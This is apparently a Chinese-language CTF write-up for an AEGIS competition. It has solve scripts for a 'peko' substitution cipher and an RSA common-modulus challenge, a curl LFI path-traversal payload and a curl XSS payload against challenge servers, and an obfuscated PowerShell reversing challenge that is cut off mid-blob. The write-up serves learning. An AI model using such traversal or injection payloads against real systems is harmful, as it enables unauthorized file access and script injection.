PekOpEKoPekOpEKOPekOPeKoPEKOPEkoPEKOPEkOPEKOpEkOPekOpEKo PekOPekOPEKOpekoPekOpEKOPEKOpeKO PEKOpeKOPEKOPEkoPekOPeKo PEKOpekoPEKOPeko PekOpEKOPEKOPEkoPEKOPEkOPekOPeKoPekOpEKo. ::: :::spoiler flag.peko\npekOpekOpEKOpeKOpekOpekOpEKOPEkOPeKoPEkOpekoPekOpekOpekOpEKOpeKOpekOpekOpEKOPEkOPeKoPEkOpekopeKOpekOpekOpEKOpeKOpekOpekOpEKOPEkOPeKoPEkOpekoPekOpekOpekOpEKOpeKOpekOpekOpEKOPEkOPeKoPEkOpekopeKOpekOpekOPEkopEkopekOpekOPekOpekopekOpekOPEKOpEkopekOpekOPekOPEkopekOpekOPEkopEkopekOpekOPekOPeKopekOpekOPEKOPEkopekOpekOPEKOPEkOpekOpekOPEKOpeKopekOpekOPEKOpeKopekOpekOPekOpekopekOpekOPEkopEkopekOpekOPekOPEkopekOpekOPEKOPekopekOpekOPEKOpEKOpekOpekOPEKOPEkopekOpekOPekOPeKopekOpekOPekOpEKopekOpekOPekOpEKOpekOpekOPEKOPEkOpekOpekOPEKOPekopekOpekOPEKOpEKOpekOpekOPEkopEkopekOpekOPekOPekOpekOpekOPEKOpeKOpekOpekOPEKOPEkOpekOpekOPekOpEKOpekOpekOPEkopEkopekOpekOPEKOpEKOpekOpekOPEKOpEkopekOpekOPEKOPEkopekOpekOPekOpEKopekOpekOPEkopEkopekOpekOPekOpEKOpekOpekOPEKOpeKOpekOpekOPEKOPEkopekOpekOPEkopEkopekOpekOPekOpekOpekOpekOPEKOPEkopekOpekOPEKOPeKOpekOpekOPEKOpEkopekOpekOPEkopEkopekOpekOPEKOpEkOpekOpekOPEKOPEkopekOpekOPEKOPEkOpekOpekOPEKOPekopekOpekOPeKoPEkOpekOpekOPeKoPEkOpekOpekOPeKoPEkOpekOpekOPeKoPEkO :::\nRecon # 他會先用itertool產生16種不同的peko(就是大小寫不一樣)，然後可以對應hex，接著阿把flag中每一個字元，用04x的方式產生，假設是字元A，就會是0041，然後會把每一個字元用peko表示，我是想說可以直接隨便assign不同的peko，然後在字頻分析但這樣行不通，因為peko是已經變成hex的結果再轉變成peko，不是單純的ascii\nExploit from 劉沛凡 # 賽後有和沛凡求解這一題，就是字頻分析，然後抓出不同的peko對應到哪一個hex digit這樣\nimport string def find(s:str, arr:list): for i, a in enumerate(arr): if(a == s): return i return None def get_flag(pekoS): ans = \u0026#34;\u0026#34; with open(\u0026#39;./神盾獎/Crypto/peko/flag.peko\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: peko_file = f.read() for p in range(0, len(peko_file), 16): this_p = peko_file[p:p+16] char_hex = 0 for i in range(0, len(this_p), 4): char = this_p[i:i+4] index = find(char, pekoS) char_hex += index * int(pow(16, 3-i//4)) ans += chr(char_hex) return ans def get_msg(pekoS): ans = \u0026#34;\u0026#34; with open(\u0026#34;message.peko\u0026#34;, encoding=\u0026#39;utf-8\u0026#39;) as f: msg_peko = f.read() i = 0 while(i \u0026lt; len(msg_peko)): if(msg_peko[i]==\u0026#39;p\u0026#39; or msg_peko[i]==\u0026#39;P\u0026#39;): chr_hex = 0 for j in range(2): this_peko = msg_peko[i:i+4] index = find(this_peko, pekoS) chr_hex += index * pow(16, 1-j) i += 4 ans += chr(chr_hex) else: ans += msg_peko[i] i += 1 return ans if __name__ ==\u0026#39;__main__\u0026#39;: # test() # print() # PEKOPEko: 65(e) # PEKOPEkO: 61(a) # PEKOPeko: 6f(o) # PEKOpeko: 69(i) # PekOpEKO: 74(t) # PEKOpEko: 6e(n) # PekOpEKo: 73(s) # PekOPeKo: 72(r) # PEKOpeKO: 68(h) # PEKOpeKo: 6c(l) # k: 6b --\u0026gt; m: 6d # n: 6e --\u0026gt; o: 6f pekoS = [\u0026#39;pekO\u0026#39;, \u0026#39;PEko\u0026#39;, \u0026#39;PekO\u0026#39;, \u0026#39;pEKo\u0026#39;, \u0026#39;PEKO\u0026#39;, \u0026#39;peko\u0026#39;, \u0026#39;PEKo\u0026#39;, \u0026#39;peKo\u0026#39;, # a: 61~7a \u0026#39;peKO\u0026#39;, \u0026#39;Peko\u0026#39;, \u0026#39;PeKo\u0026#39;, \u0026#39;pEkO\u0026#39;, \u0026#39;pEKO\u0026#39;, \u0026#39;pEko\u0026#39;, \u0026#39;PEkO\u0026#39;, \u0026#39;PeKO\u0026#39;] new_pekos = [\u0026#39;\u0026#39;] * 16 new_pekos[0x1] = \u0026#34;PEkO\u0026#34; new_pekos[0x2] = \u0026#34;PeKo\u0026#34; new_pekos[0x3] = \u0026#34;pEKo\u0026#34; new_pekos[0x4] = \u0026#34;pEKO\u0026#34; new_pekos[0x5] = \u0026#34;PEko\u0026#34; new_pekos[0x6] = \u0026#34;PEKO\u0026#34; new_pekos[0x7] = \u0026#34;PekO\u0026#34; new_pekos[0x8] = \u0026#34;peKO\u0026#34; new_pekos[0x9] = \u0026#34;peko\u0026#34; new_pekos[0xb] = \u0026#34;PeKO\u0026#34; new_pekos[0xc] = \u0026#34;peKo\u0026#34; new_pekos[0xd] = \u0026#34;pEkO\u0026#34; new_pekos[0xe] = \u0026#34;Peko\u0026#34; new_pekos[0xf] = \u0026#34;pEko\u0026#34; j = 0 for i in range(16): if(new_pekos[i] == \u0026#39;\u0026#39;): while(j \u0026lt; 16): if(pekoS[j] not in new_pekos): new_pekos[i] = pekoS[j] j += 1 break j += 1 ans = get_flag(new_pekos) print(ans) Flag: AEGIS{HA↗HA↘HA↗HA↘_you_really_understand_what_does_the_peko_mean!!!!}\nwhich e # Source Code # from SECRET import flag, es from Crypto.Util.number import * import random p = getPrime(1024) q = getPrime(1024) n = p*q e1, e2 = random.choices(es, k=2) ct1, ct2 = pow(bytes_to_long(flag), e1, n), pow(bytes_to_long(flag), e2, n) print(f\u0026#39;{n = }\u0026#39;) print(f\u0026#39;{es = }\u0026#39;) print(f\u0026#39;{ct1 = }\u0026#39;) print(f\u0026#39;{ct2 = }\u0026#39;) # n = 20782094472022109913631053818123481314358944883396654584516175755337955289128841997397141690858683591346710225928026680210031134488162388853901104522000425177038869537184711096682800321172870549969722352041029574813559027093774535381141473019256619664357125684984109218433340074987224018864651250110207302474620251730005617102482997519993822019400267427066397925336137098715014071432685862189893780805644936375709083564314558208329155294583964820538153811106221663859745695780810934702838639809694604134389094620698953597448326299416854544126162177248901039969526974298949384764574521733836369894812160498414061278457 # es = [335337, 313179, 269499, 379023, 371181, 270051, 220263, 340071, 331257, 323571, 291219, 242967, 250329, 376413, 260571, 299067, 323151, 252741, 284433, 284997, 348423, 283317, 273711, 228309, 320079, 387507, 261969, 372891, 201171, 255999, 336783, 359097, 380199, 389523, 319119, 210963, 338271, 314733, 302307, 388599, 303189, 281847, 311097, 230619, 206673, 196743, 338853, 372441, 319323, 279921, 253947, 374007, 277869, 219543, 228477, 252051, 381651, 210963, 235461, 333363, 224493, 302079, 248343, 337749, 228759, 316221, 352059, 222231, 312843, 345963, 361149, 253041, 296679, 389121, 207033, 313581, 287673, 226011, 253263, 217263, 334023, 298821, 234579, 370551, 201219, 318309, 244119, 207201, 250491, 206211, 258729, 273477, 228729, 202497, 245607, 340467, 358539, 383127, 304431, 202281] # ct1 = 19709743339564991804745681115350974372218624590145295802653022468829666431062762354693488775038538517971874948390047688873629817259587030666447031169862529158085441779725040499056422480291136903603954644304255737741035865182817441587372965818712406675073361927388455300368033314471690855039561675596434398805610888413683006957007149075165107751889836036211829189707158707161053627042709933130100558040673044576246215229316759458111911263969916816199728299939403886659211227589012138349192265860651321454855635391254622100851097667564422565303625802434012342400168311644481172125168020823080267961123371034855932354916 # ct2 = 3144096154592910529360143032579454468513076244255719410364100435366987913839116217794544574076666469176273818794720632620929327592877795439390571015644946470430387325459620216625122790371215233469473167531757391134016035626115279844206675821962817812047440715912759250522087934960874603377231959891998816377704543935736564408410454393529587586434819555459554651268212362722358933708539958292122558547910920833059403504654129556083401510281318870186055182605989663027327210726708592147792782370105881543186498558353214098414079098151562885483861802934327453409113360413706279722173079071697336629295774554840355204563 Recon # 這題直覺應該是共模攻擊，詳細可以看模數相關攻擊 - CTF Wiki，反正他有很多的e，每一個e如果都除以3都會是prime，也就是達成了這個攻擊的條件，$e_1$,$e_2$互質/$N$相同/也拿到$c_1$,$c_2$，我寫的script如下，但不知道是哪邊出了問題 $$ c_1=m^{e_1}\\ (mod\\ N)\\ c_2=m^{e_2}\\ (mod\\ N)\\ \\because s*({e_1\\over 3}) + t*({e_2\\over 3}) = 1(歐基里德擴展)\\ \\therefore se_1 + t e_2 = 3\\ c_1^s * c_2^t = m^{e_1\\cdot s+e_2\\cdot t} = m^3\\ (mod\\ N) $$ :::info [23/10/23 更新]: 賽後有和沛凡和asef討論這個題目，終於知道問題出在哪邊，當我們解出$m^3$時，要記得$mod\\ n$，然後找到$m$的方式就是暴力搜，暴力搜得意思是因為我們拿到的$m^3$其實是$mod\\ N$的結果，代表要找到真正的flag可能要再加上數個$N$才會是原本的flag，也就是$flag \\equiv m^3\\ (mod\\ N)\\to flag=k\\cdot N+m^3|k\\in \\mathbb{Z}$，所以我們只要暴力找到那個$k$使得$m^3$開三次方根是整數就代表我們找到真正的flag了 :::\nExploit Refer apart from 劉沛凡 \u0026amp; @asef # import gmpy2 from Crypto.Util.number import long_to_bytes from tqdm import trange from sage.all import * n = 20782094472022109913631053818123481314358944883396654584516175755337955289128841997397141690858683591346710225928026680210031134488162388853901104522000425177038869537184711096682800321172870549969722352041029574813559027093774535381141473019256619664357125684984109218433340074987224018864651250110207302474620251730005617102482997519993822019400267427066397925336137098715014071432685862189893780805644936375709083564314558208329155294583964820538153811106221663859745695780810934702838639809694604134389094620698953597448326299416854544126162177248901039969526974298949384764574521733836369894812160498414061278457 c1 = 19709743339564991804745681115350974372218624590145295802653022468829666431062762354693488775038538517971874948390047688873629817259587030666447031169862529158085441779725040499056422480291136903603954644304255737741035865182817441587372965818712406675073361927388455300368033314471690855039561675596434398805610888413683006957007149075165107751889836036211829189707158707161053627042709933130100558040673044576246215229316759458111911263969916816199728299939403886659211227589012138349192265860651321454855635391254622100851097667564422565303625802434012342400168311644481172125168020823080267961123371034855932354916 c2 = 3144096154592910529360143032579454468513076244255719410364100435366987913839116217794544574076666469176273818794720632620929327592877795439390571015644946470430387325459620216625122790371215233469473167531757391134016035626115279844206675821962817812047440715912759250522087934960874603377231959891998816377704543935736564408410454393529587586434819555459554651268212362722358933708539958292122558547910920833059403504654129556083401510281318870186055182605989663027327210726708592147792782370105881543186498558353214098414079098151562885483861802934327453409113360413706279722173079071697336629295774554840355204563 es = [335337, 313179, 269499, 379023, 371181, 270051, 220263, 340071, 331257, 323571, 291219, 242967, 250329, 376413, 260571, 299067, 323151, 252741, 284433, 284997, 348423, 283317, 273711, 228309, 320079, 387507, 261969, 372891, 201171, 255999, 336783, 359097, 380199, 389523, 319119, 210963, 338271, 314733, 302307, 388599, 303189, 281847, 311097, 230619, 206673, 196743, 338853, 372441, 319323, 279921, 253947, 374007, 277869, 219543, 228477, 252051, 381651, 210963, 235461, 333363, 224493, 302079, 248343, 337749, 228759, 316221, 352059, 222231, 312843, 345963, 361149, 253041, 296679, 389121, 207033, 313581, 287673, 226011, 253263, 217263, 334023, 298821, 234579, 370551, 201219, 318309, 244119, 207201, 250491, 206211, 258729, 273477, 228729, 202497, 245607, 340467, 358539, 383127, 304431, 202281] def integer_root(cipher, n, root): for i in trange(200000000): trial = ZZ(cipher + i * n).nth_root(root, truncate_mode=1) if(trial[1]): return trial[0] return None check = False for i in trange(len(es)): for j in range(len(es)): if es[i] != es[j]: if(pow(c1, es[i], n) == pow(c2, es[j], n)): e1 = es[j] e2 = es[i] check = True break if check: break gcd, s, t = gmpy2.gcdext(e1, e2) m_3 = (gmpy2.powmod(c1, s, n) * gmpy2.powmod(c2, t, n)) % n flag = integer_root(m_3, n, gcd) # k = Zmod(n) # flag = k(m_3).nth_root(3) print(f\u0026#39;Flag: {long_to_bytes(flag)}\u0026#39;) Flag: AEGIS{ju57_bru73_f0rc3_4nd_36cd_anVzdF9ic}\nComputer # Source Code # :::spoiler Source Code\nphp //require \u0026#34;/flag.php\u0026#34;; if (isset($_POST[\u0026#39;component\u0026#39;])) { $component = $_POST[\u0026#39;component\u0026#39;]; $lowercaseComponent = strtolower($component); $pattern_file = \u0026#34;/^cpu|gpu|hd|io|ram|psu$/\u0026#34;; $keyword = \u0026#34;source\u0026#34;; if (preg_match($pattern_file, $lowercaseComponent)) { $lowercaseComponent = \u0026#34;./component/\u0026#34; . $lowercaseComponent; $file = fopen($lowercaseComponent, \u0026#39;r\u0026#39;); if ($file !== false) { while (($line = fgets($file)) !== false) { echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo $line; } } else { echo \u0026#34;No such file or directory\u0026#34;; } fclose($file); } elseif (strpos($lowercaseComponent, $keyword) !== false) { highlight_file(__FILE__); } else { echo \u0026#34;No such file or directory\u0026#34;; } } ?\u0026gt; :::\nRecon # 這一題主要是LFI的洞，然後查看封包會發現只要輸入的參數component內容中有帶入cpu|gpu|hd|io|ram|psu等特定字，就會過preg_match，然後我們可以加上../flag.php之類的路徑，最後他會吐出該檔案中的內容(如果該檔案存在)\nExploit - LFI # 這一題不知道為啥在本地端自己測試的時候會成功讀取到flag，但是在server side就爛掉了\n$ curl -X POST http://35.236.149.150/computer_componets/index.php -d \u0026#34;component=ram../../../../flag.php\u0026#34; \u0026amp;#127822\u0026amp;#127820\u0026amp;#127817\u0026amp;#127822\u0026amp;#127820\u0026amp;#127817 # Recon # 這一題有非常明顯的XSS，用burp看package直接把參數換成script tag就好，然後…，就沒有然後了，我不會後續的利用 QAQ Exploit - XSS # $ curl -X POST 34.80.25.177:5000 --data \u0026#34;fruit_selector=\u0026lt;script\u0026gt;alert(123);\u0026lt;/script\u0026gt;\u0026#34; :::info 23/10/22 更新: 今天有跟Kaibro聊一下這一題，如果是XSS的洞通常連不到後端，因為本身就只是前端的洞，不過如果可以利用一些社交工程或是session hijacking的技術拿到後端的帳密，也是有不錯的傷害，但我猜這一題應該不是考XSS，應該還有其他更明顯的洞 :::\nKill 4 # Source Code # :::spoiler\nWrite-Host \u0026#34;Please input integer arry\u0026#34; -ForegroundColor green Write-Host \u0026#34;EX : 1 2 3 4 5...\u0026#34; -ForegroundColor green $n = $(\u0026#34;O\u0026#34;, \u0026#34;0\u0026#34;, \u0026#34;r\u0026#34;, \u0026#34;e\u0026#34;, \u0026#34;m\u0026#34;, \u0026#34;o\u0026#34;, \u0026#34;v\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;h\u0026#34;, \u0026#34;i\u0026#34;, \u0026#34;l\u0026#34;, \u0026#34;d\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;y\u0026#34;, \u0026#34;c\u0026#34;, \u0026#34;u\u0026#34;, \u0026#34;n\u0026#34;, \u0026#34;t\u0026#34;, \u0026#34;p\u0026#34;, \u0026#34;s\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;=\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;k\u0026#34;, \u0026#34;g\u0026#34;, \u0026#34;;\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;M\u0026#34;, \u0026#34;a\u0026#34;, \u0026#34;T\u0026#34;, \u0026#34;(\u0026#34;, \u0026#34;)\u0026#34;, \u0026#34;S\u0026#34;, \u0026#34;I\u0026#34;, \u0026#34;w\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;9\u0026#34;, \u0026#34;]\u0026#34;, \u0026#34;H\u0026#34;, \u0026#34;Y\u0026#34;, \u0026#34;U\u0026#34;, \u0026#34;G\u0026#34;, \u0026#34;J\u0026#34;, \u0026#34;f\u0026#34;, \u0026#34;$\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;x\u0026#34;, \u0026#34;[\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;j\u0026#34;, \u0026#34;7\u0026#34;, \u0026#34;q\u0026#34;, \u0026#34;K\u0026#34;, \u0026#34;P\u0026#34;, \u0026#34;W\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;Z\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;z\u0026#34;, \u0026#34;6\u0026#34;, \u0026#34;8\u0026#34;, \u0026#34;_\u0026#34;, \u0026#34;-\u0026#34;, \u0026#34;F\u0026#34;, \u0026#34;Q\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;N\u0026#34;,\u0026#34;,\u0026#34;,\u0026#34;{\u0026#34;,\u0026#34;}\u0026#34;,\u0026#34;A\u0026#34;,\u0026#34;\u0026#39;\u0026#34;) $5S55S55S55SS555 = $n[9..9+16..16+32..32+36+2..2+17] -join \u0026#39;\u0026#39; $nn = \u0026#39;$n\u0026#39; ${S555555S555555} = $env:comspec $i = 0..74 $555555555SS55SS5 = $n[46..46+15..16+14+17..17+9..9+5+16..16+48] -join \u0026#39;\u0026#39; $S55S5S5SSS55SS55 = $i[0..1+1..1+0..1+1..1+1..1+0..1+0..0+0..0+0..1+0..1+0..0] | ConvertTo-Json $5S55S555S5S5S5S5 = \u0026#34;\u0026#34;.$5S55S55S55SS555 $SSS5S5S55SS5SSSS = $n[29..29+5..5+29..29] -join \u0026#39;\u0026#39; $5S5S5S555S5SSSSS = $n[29..29+64+29..29] -join \u0026#39;\u0026#39; ${5S55S5S5S55S5S} = \u0026#34;$5S55S555S5S5S5S5\u0026#34; $S5S555SSSS5S5S5S = $n[67..67+15..15+67] -join \u0026#39;\u0026#39; $SSS5S55SSS5SSS55 = $n[29..29+34..34+29] -join \u0026#39;\u0026#39; $5S55S55S5SS55S55 = $n[47..47+13+48..48+21+48..48+29..29+64..64+29..29+48+47..47+13+72..72+25..25] -join \u0026#39;\u0026#39; $SSS5SSSSSSS5S5S5 = $n[47..47+34..34+21+38..38+25..25] -join \u0026#39;\u0026#39; $S5S55S5SS55S5S5S = $n[2..3+29+15..15+68..69+48+29..29+5+29..29+48..48+47..47+16..16+49..49+48+38..38] -join \u0026#39;\u0026#39; $S5S5555SS5555S55 = $n[56..56+28..28+2..2+28+27..27+30+50..50+33..33+16..17+40..40+47+49..49+70..70+50+9..9+16..17+40+47..47+13+31..31+25..25] -join \u0026#39;\u0026#39; $SSS55S5SS55S5SS5 = $n[68..68+3+17..17+15..15+2..2+16+48..48+47..47+49] -join \u0026#39;\u0026#39; $S5S55S5SS5SSS5S5 = $n[68..68+3..3+29..29+15+68..68+16+48..48+47+61..61+72..72] -join \u0026#39;\u0026#39; $5S55S55SSSS5S5S5 = $n[47..47+61..61+48+21..21+48..48+29+5..5+29+48+47..47+13..13+48+47..47+61..61+72+25..25] -join \u0026#39;\u0026#39; $SSS5555S55555S55 = $n[56..56+73+68..68+28+4..4+30..30+50+33.33+16..16+29+40..40+47+49..49+70..70+50..50+9..9+69+29..29+40..40+47..47+13..13+31+48..48] -join \u0026#39;\u0026#39; $5S55S55SS555SS55 = $n[47..47+14..14+48+21..21+48+47..47+49..49+48+65..65+12..12+28..28+16..16+11+48..48+47..47+13..13] -join \u0026#39;\u0026#39; $SS5S55SSS5SS555S = $n[34..34+8..10+36..36+30..30+30..30+47..47+49..49+48+65..65+24+3..3+48+47..47+34..34+31+48..48+65+28..28+16..16+11..11+48..48+47+13..13+31+71..71+25..25] -join \u0026#39;\u0026#39; $5S55S55S5S5SSS55 = $n[47..47+34..34+48+21..21+48+47..47+34+48..48+65+19..19+8+10..10+48..48+38+72..72+25] -join \u0026#39;\u0026#39; $SSS5SSSSS5S55555 = $n[34..34+8..10+3+30..30+47..47+13+48..48+65..65+16+3..3+48+1..1+31..31+71+25..25] -join \u0026#39;\u0026#39; $S55S5S5SSS55SS5S = $nn+$S55S5S5SSS55SS55+\u0026#34;-join \u0026#39;\u0026#39;\u0026#34; $SS555SSSS5SS5SSS = @(20,14280,9506,13340,420,9702,12432,13110,12210,420,342,156,210,10100,11130,10302,10100,420,11130,12210,420,462,12,72) $55555555SS5S5555 = $S55S5S5SSS55SS5S | \u0026amp;(${5S55S5S5S55S5S}[14,-2,27] -join \u0026#39;\u0026#39;) $SSS555555555555S = $55555555SS5S5555 $SSS5555SS55S5S55 = $n[18..18+28+2..2+28..28+4+30..30+50..50+9..9+16+17..17+40+47..47+49+31..31+48] -join \u0026#39;\u0026#39; $SSS55SSS5SS55SS5 = $i[50..50+19..19+13..13+32..32+17..17+3..4+22.22+7..7+5..5+16..16+19..19+0..0+10..10+3..3+40..40+20..20+20..20+2..3+28..28+11..9+16..16+36..36+30..31] | ConvertTo-Json $SS5SSS5SSSS55SSS = $n[47..47+16..16+13..13+48..48+21+48..48+29..29+64..64+29..29+48+47..47+13..13+25] -join \u0026#39;\u0026#39; $5S55S55SSSS55S5S = $n[47..47+13..13+48..48+21+48..48+47+14..14+48+65..65+19..19+8..8+10+48..48+38..38+72..72+25..25] -join \u0026#39;\u0026#39; $SS5S55SSS55SS55S = $n[9..9+46..46+30..30+47..47+49..49+48+65..65+10..10+17+48..48+1..1+31..31+71..71] -join \u0026#39;\u0026#39; $5S55S55SSSS555SS = $n[47..47+49+48..48+21..21+48+47..47+49..49+48..48+65+12..12+49..49+5..5+2+48..48+47..47+13..13+25] -join \u0026#39;\u0026#39; $SSS55SSS5SS55S55 = $nn+$SSS55SSS5SS55SS5+\u0026#34;-join \u0026#39;\u0026#39;\u0026#34; $5S55S55SS5SSS5SS = $n[47..47+16..16+49..49+48+21..21+48..48+65+12..12+16..16+5..5+17..17+47+49..49+25] -join \u0026#39;\u0026#39; $5SSSS5S5SS5555S5 = $n[47..47+61+21..21+1+25..25] -join \u0026#39;\u0026#39; $SSS5S55S5S55SSSS = $555555555SS55SS5+$SSS5S5S55SS5SSSS+$n[71]+\u0026#39; \u0026#39;+$S5S5555SS5555S55+$SSS5SSSSS5S55555+$5S55S55SS555SS55+\u0026#39; \u0026#39;+$5S55S55SSSS555SS+$5S55S55SSSS55S5S+$SSS55S5SS55S5SS5+$n[72] $5S5S5555S55S55SS = $n[33..33+66..66+30+47..47+49..49+48..48+65+12..12+28+16..16+11+48..48+47+34..34+31..31+71+25..25] -join \u0026#39;\u0026#39; $SSS5S55SSS5S5SS5 = $n[2..2+36+29..29+15..15+68..69+48+29..29+5..5+29+48..48+47..47+49..49+48..48+47+16..16+13] -join \u0026#39;\u0026#39; $S5S5555S55555SS5 = $n[18..18+73..73+2+73..73+4..4+30+50..50+9..9+69+17..17+40..40+47+49..49+70+50..50+33..33+16..16+29..29+40+47..47+13..13+31..31+48+25..25] -join \u0026#39;\u0026#39; $SSS5S55S5S55S555 = $555555555SS55SS5+$S5S555SSSS5S5S5S+$n[71]+\u0026#39; \u0026#39;+$SSS5555S55555S55+$SS5SSS5SSSS55SSS+$SSS5S55SSS5S5SS5+$n[72] $5S55S55S5SS555SS = $n[47..47+49..49+48+21..21+48..48+29..29+64+29..29+48..48+47..47+49..49+25] -join \u0026#39;\u0026#39; $SSS55SSSS5S5555S = $n[47..47+13+48..48+21..21+48+47..47+13..13+48+65..65+19+8..8+10..10+48..48+38..38+25] -join \u0026#39;\u0026#39; $SSS55SSS5SS55SSS = $SSS55SSS5SS55S55 | \u0026amp;(${5S55S5S5S55S5S}[3,10,-16] -join \u0026#39;\u0026#39;) $SSSSSSSSSSSSSSS5 = $555555555SS55SS5+$SSS5S55SSS5SSS55+$n[71]+\u0026#39; \u0026#39;+$S5S5555S55555SS5+$SSS5SSSSSSS5S5S5+$5SSSS5S5SS5555S5+$SS5S55SSS55SS55S+\u0026#39; \u0026#39;+$5S55S55S5SS555SS+$5S55S55S5SS55S55+$SS5S55SSS5SS555S+$5S5S5555S55S55SS+$5S55S55SSSS5S5S5+$SSS55SSSS5S5555S+$5S55S55S5S5SSS55+$S5S55S5SS5SSS5S5 $SS55S555SS55555S = $SSS5S55S5S55SSSS | \u0026amp;(${5S55S5S5S55S5S}[7,-17,27] -Join \u0026#39;\u0026#39;) $SSS55SSS5SS55S5S = \u0026#39;$in=\u0026#39;+$SSS55SSS5SS55SSS $S5S5S555SS5555SS = $SSS5S55S5S55S555 | \u0026amp;(${5S55S5S5S55S5S}[14,-2,27] -Join \u0026#39;\u0026#39;) $SSS5S55S5S55SSS5 =$555555555SS55SS5+$5S5S5S555S5SSSSS+$n[71]+\u0026#39; \u0026#39;+$SSS5555SS55S5S55+$5S55S55SS5SSS5SS+$S5S55S5SS55S5S5S+$n[72] $SSS55SSS5SS55S5S | \u0026amp;(${S555555S555555}[4,15,25] -Join \u0026#39;\u0026#39;) $SS55S555SS5555SS = $SSS5S55S5S55SSS5 | \u0026amp;(${S555555S555555}[4,15,25] -Join \u0026#39;\u0026#39;) $S5S5555S5S55S5SS = $555555555SS55SS5+$SSS555555555555S+\u0026#39;{ Write-Host \u0026#34;NICE !! Exchange A Sincere Affection For A Hopeless Feeling\u0026#34; -ForegroundColor Cyan} \u0026#39;+$SSS555555555555S $inn = -split $in $5555555S5555555S = $SSSSSSSSSSSSSSS5 | \u0026amp;(${5S55S5S5S55S5S}[3,10,-16] -Join \u0026#39;\u0026#39;) function QQ{ param([string[]]$inArr) if(($inArr.count -le 0) -or ($inArr.count -gt 24)){ Write-Host \u0026#34;QQ heart broken\u0026#34; -ForegroundColor red return 0 }else{ for($k=0;$k -lt $inArr.count;$k++){ $p = [convert]::ToInt32($inArr[$k],10) $R = $p | ForEach-Object -Process { $N = $S5S555SSSS5S5S5S+\u0026#39; $_ 1\u0026#39; $H = $N | \u0026amp;(${5S55S5S5S55S5S}[3,10,-16] -Join \u0026#39;\u0026#39;) $NN = $SSS5S55SSS5SSS55+\u0026#39; $_ $H\u0026#39; $HH = $NN | \u0026amp;(${5S55S5S5S55S5S}[14,-2,27] -Join \u0026#39;\u0026#39;) $NNN = $SSS5S55SSS5SSS55+\u0026#39; 2 $_\u0026#39; $HHH = $NNN | \u0026amp;(${S555555S555555}[4,15,25] -Join \u0026#39;\u0026#39;) $NNNN = $SSS5S5S55SS5SSSS+\u0026#39; $HH $HHH\u0026#39; $NNNN | \u0026amp;(${S555555S555555}[4,15,25] -Join \u0026#39;\u0026#39;) } if($R -ne $SS555SSSS5SS5SSS[$k]){ return 0 } } return 1 } } $FR = QQ $inn if($FR -eq 1){$S5S5555S5S55S5SS | \u0026amp;(${5S55S5S5S55S5S}[7,-17,27] -Join \u0026#39;\u0026#39;)}else{\u0026#34;Not cruel enough !!\u0026#34;;exit} $Carr = $inn | %{[convert]::ToInt32($_,10) } [System.runtime.inTERopsErvICes.MArsHAL]::pTRTOstRINGAnsI([rUntIME.intEROpsERVICeS.MArshAl]::SeCUReSTRiNGToGLObalALLocansI($(\u0026#39;76492d1116743f0423413b16050a5345MgB8AHoAawAvAG4AbQBnAHcAYQByAFMAUwBXADkAZABaADgAVwB4AE8AagBRAHcAPQA9AHwAMABjAGMAYwBiADIANQBhADgAMwA1AGEANwBkAGYAOQBkAGEAYgBlADEAOQA3ADEAYgA5ADYAOQBlAGMAMgBlADEAYgAzADcANQA4ADgANABkAGIAYQBiAGMANQA2AGMAZAA2AGEAMAAzADIAMQAzADMAOQBlAGYAZgAzADIANABmADkAMQBiADcANQBlAGMAMgAwADAANgAwADAANAAxAGQANABiADkAYQAyADQAMwBlADQANQAwAGQAMgA1ADQANwBlADUAMABlADMAMAA0ADkANQBmAGQAYQA1ADUANQAwADUAYgA4ADkANABhADMAMgBhADQAYgAzAGEAZgAwAGIANwBjADAANgA2ADIAYwA0ADYAYwAxAGUAZQBjADgAZAA1AGQAOAA1ADgAMABiADAAOQA5ADUANgA3ADUANABmADEAZAA5ADYAZQA0AGIAMQBmAGYAZAAxADQAMQAxADIANgA3ADkAYwA4AGQANgAyADAANwAxAGYAMwA3ADIANwA0ADcAYgAzADkAYgBiADIAYQAxADQANgBkAGIANQAwADYAMwA5AGIAOABlADEAZgA3AGEAZgA3AGUAZgAzADYANABlAGIANgBkAGUAYgA3AGEAMgA1ADEAZQBjAGQANwAxADgANgA4ADkAZQBjAGMAYQAxAGMAYQA0ADIANAAzAGQAMQBiAGQAMQBhADcAZQBjADEAMgAyADQAMwBjAGYAMQA3ADUAMABkADEANgBjADUAMAA5ADIANQA0ADQAYQBjADUAOQA3ADkANgAyAGMAYQAzADYAZAA4ADkAMgA3ADcAZQAwADIAMABjAGUANABmADYAYgBiADAANgA5ADYAYQBjADcAMwA4ADYANABhADgANwBlADMAMQA1ADMAYQBiAGQAZgA1AGQANwA2ADQAOAAzADkAOAAxADIAMQAwADAAMABkAGQAMwBlAGUAMwAzAGQAOQBmAGYAYgAxADIAZABiAGEAZQAyAGEAZgA4ADkAYwBkADEAZABjAGQAZgA4ADEAYgBhADUAMwA3ADAANgA0ADgAMQBiADMAYQBjADUAYQA2AGMAYwBjADYAOAA1AGYAYgAwADEAZgA2AGQAZgA5ADYANQBhADkAMABiAGQANgA3AGMAOABhADAANQBjADUAOAAzADcAOABlAGIANAA3AGMAZAA4ADcAYwA4AGEAMABjAGEAMgBjADQAYwAyADMAYQAxADgAMwA4ADUAOABmADcAYQA5AGYAZQBhAGIAOQA2ADUAMAA5ADMAMgBjADUAOQA4ADgAOAA3AGIANQAyADgAMwBiADQAZAA4AGYANwBhADEAYwAyADgAZABiADQAMwA0AGYANgA0ADQANQAwADIANQBjAGMAYQA5ADcAYQAwADkANQBkAGUAYwBmAGYAOAAxAGIAMQA0AGUANQA3AGIAMQA1ADYANQA0AGEAYwBhADAAZgBhAGMAMwAxAGEANgBjADEAZQBiADgANwBlAGIANQAxAGUANQBhADEAMQBmADMAOAAwADIAMAA